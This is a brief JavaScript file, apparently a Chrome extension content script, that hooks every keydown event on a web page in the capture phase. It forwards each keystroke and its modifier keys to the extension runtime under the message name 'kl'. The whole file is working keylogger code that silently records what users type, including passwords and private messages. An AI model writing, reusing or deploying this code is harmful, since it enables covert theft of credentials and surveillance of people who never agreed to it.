var lastLog = new Date().getTime();

function out(input) {
    var now = new Date().getTime();
    if (now - lastLog < 10)
        return;

    lastLog = now;
    chrome.runtime.sendMessage({
        message: "kl",
        data: input
    });
}

function keystrokeHandler(event) {
    if (!event)
    event = window.event;

    if (!event.key || event.key.length == 0)
        return;

    if (event.altKey && event.key != "Alt")
        out({
            alt: true,
            key: event.key
        });
    else if (event.ctrlKey && event.key != "Control")
        out({
            ctrl: true,
            key: event.key
        });
    else if (event.shiftKey && event.key != "Shift" && event.key.length > 1)
        out({
            shift: true,
            key: event.key
        });
    else
        out(event.key);
}

document.removeEventListener('keydown', keystrokeHandler, true);
document.addEventListener('keydown', keystrokeHandler, true);
